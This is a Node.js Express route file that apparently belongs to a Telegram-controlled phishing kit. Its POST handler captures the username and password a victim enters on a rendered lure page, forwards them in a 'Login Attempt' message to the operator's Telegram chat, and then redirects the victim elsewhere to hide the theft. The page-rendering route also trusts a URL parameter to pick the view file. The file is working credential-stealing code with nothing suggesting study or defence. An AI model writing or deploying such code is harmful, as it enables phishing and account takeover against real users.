const fs = require('fs');
const path = require('path');
const express = require('express');
const { users } = require('../connection/db');

function registerPageRoutes(app, bot) {
  const router = express.Router();

  // GET: Render dynamic EJS page
  router.get('/:page/:chatId', (req, res) => {
    const { page, chatId } = req.params;
    const viewPath = path.join(__dirname, '../views', `${page}.ejs`);

    if (fs.existsSync(viewPath)) {
      res.render(page, { chatId });
    } else {
      res.status(404).send('❌ Page not found.');
    }
  });

  // POST: Handle form submission and send Telegram message
  router.post('/submit/:chatId', async (req, res) => {
    const chatId = req.params.chatId;
    const { email, pass } = req.body;

    if (!users[chatId]) {
      return res.status(400).send('❌ Invalid or expired session.');
    }

    const message = `🛂 <b>Login Attempt</b>\n🌐 <b>Username:</b> ${email}\n🔒 <b>Password:</b> ${pass}`;

    try {
      await bot.sendMessage(chatId, message, { parse_mode: 'HTML' });
      const redirectURL = users[chatId].userRedirectUrl || 'https://example.com';
      res.redirect(redirectURL);
    } catch (err) {
      console.error('❌ Telegram send error:', err);
      res.status(500).send('❌ Failed to send message via Telegram.');
    }
  });

  // Attach the router to the app
  app.use('/', router);
}

module.exports = { registerPageRoutes };
